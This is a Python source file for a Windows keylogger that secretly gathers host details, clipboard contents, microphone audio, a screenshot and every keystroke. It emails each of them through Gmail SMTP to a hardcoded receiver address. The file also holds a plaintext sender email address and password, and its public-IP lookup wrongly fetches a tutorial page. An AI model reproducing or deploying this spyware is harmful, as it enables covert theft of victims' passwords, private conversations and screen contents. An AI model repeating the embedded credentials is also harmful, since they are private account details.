import platform
import smtplib
import socket
import ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import sounddevice as sd
import win32clipboard
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from requests import get
from scipy.io.wavfile import write

# port = 465  # For SSL
# port = 587 for TLS

key_information = "key_log.txt"
system_information = "system.txt"
audio_information = "audio.mp3"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"

subject = "KeyLogger attachment"
body = "This is an email with attachment sent from KeyLogger"
sender_email = "sunitagokhle3@gmail.com"
receiver_email = "pwnsub2001@gmail.com"
password = "Pawan20@"

file_path = "C:\\Users\\pwnpe\\PycharmProjects\\KeyLogger"
extend = "\\"


def send_mail(filename, attachment, to_address):
    # Create a multipart message and set headers
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject
    message["Bcc"] = receiver_email  # Recommended for mass emails

    # Add body to email
    message.attach(MIMEText(body, "plain"))

    filename = filename  # In same directory as script

    # Open PDF file in binary mode
    with open(filename, "rb") as attachment:
        # Add file as application/octet-stream
        # Email client can usually download this automatically as attachment
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    # Encode file in ASCII characters to send by email
    encoders.encode_base64(part)

    # Add header as key/value pair to attachment part
    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {filename}",
    )

    # Add attachment to message and convert message to string
    message.attach(part)
    text = message.as_string()

    # Log in to server using secure context and send email
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, text)


# send_mail(key_information, file_path + extend + key_information, receiver_email)

def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        host_name = socket.gethostname()
        IP_Address = socket.gethostbyname(host_name)
        try:
            public_ip = get("https://realpython.com/python-send-email/").text
            f.write("Public Ip Address : " + public_ip + "\n")
        except Exception:
            f.write("Could get Public IP Address \n")
        f.write("Processor : " + platform.processor() + "\n")
        f.write("System : " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine : " + platform.machine() + "\n")
        f.write("Hostname : " + host_name + "\n")
        f.write("Private IP address : " + IP_Address + "\n")

computer_information()
send_mail(system_information, file_path + extend + system_information, receiver_email)

def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            copy_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data : " + copy_data + "\n")
        except:
            f.write("Clipboard could not be copy \n ")

copy_clipboard()
send_mail(clipboard_information, file_path + extend + clipboard_information, receiver_email)

microphone_time = 10

def microphone():
    sampling_frequency = 44100
    second = microphone_time
    recording = sd.rec(int(second * sampling_frequency), samplerate=sampling_frequency, channels=2)
    sd.wait()
    write(file_path + extend + audio_information, sampling_frequency, recording)

microphone()
send_mail(audio_information, file_path + extend + audio_information, receiver_email)

def screenshot():
    image = ImageGrab.grab()
    image.save(file_path + extend + screenshot_information)
screenshot()
send_mail(screenshot_information, file_path + extend + screenshot_information, receiver_email)


count = 0
keys = []

def on_press(key):
    global keys, count
    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(key):
    with open(file_path + extend + key_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("enter") > 0:
                f.write("\n")
                f.close()
            elif k.find("space") > 0:
                f.write(" ")
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

send_mail(key_information, file_path + extend + key_information, receiver_email)

